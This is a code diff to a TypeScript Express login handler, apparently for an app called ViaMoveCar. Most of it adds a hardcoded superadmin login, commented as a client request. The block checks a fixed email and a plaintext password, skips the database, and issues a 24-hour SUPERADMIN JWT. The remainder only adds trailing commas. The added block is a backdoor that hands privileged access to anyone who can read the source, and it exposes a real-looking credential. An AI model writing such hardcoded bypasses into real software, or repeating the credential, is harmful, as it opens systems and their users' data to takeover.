@@ -9,6 +9,29 @@ export const login = async (req: Request, res: Response) => {
     try {
         const { email, password } = req.body;
 
+        // Login fixo para SUPERADMIN (pedido do cliente)
+        if (email === 'dev.karenfernandes@gmail.com' && password === 'Klpf1212!') {
+            const superadminPayload = {
+                id: 'superadmin-fixed',
+                email,
+                role: 'SUPERADMIN',
+            };
+
+            const token = jwt.sign(superadminPayload, JWT_SECRET, { expiresIn: '24h' });
+
+            return res.json({
+                token,
+                user: {
+                    id: superadminPayload.id,
+                    full_name: 'Superadmin ViaMoveCar',
+                    email: superadminPayload.email,
+                    role: superadminPayload.role,
+                    email_validated: true,
+                    user_type: 'superadmin',
+                },
+            });
+        }
+
         if (!pool) return res.status(500).json({ error: 'Database not configured' });
 
         const result = await pool.query('SELECT * FROM app_users WHERE email = $1', [email]);
@@ -45,8 +68,8 @@ export const login = async (req: Request, res: Response) => {
                 email: user.email,
                 role: user.role,
                 email_validated: user.email_validated,
-                user_type: user.user_type
-            }
+                user_type: user.user_type,
+            },
         });
 
     } catch (error) {
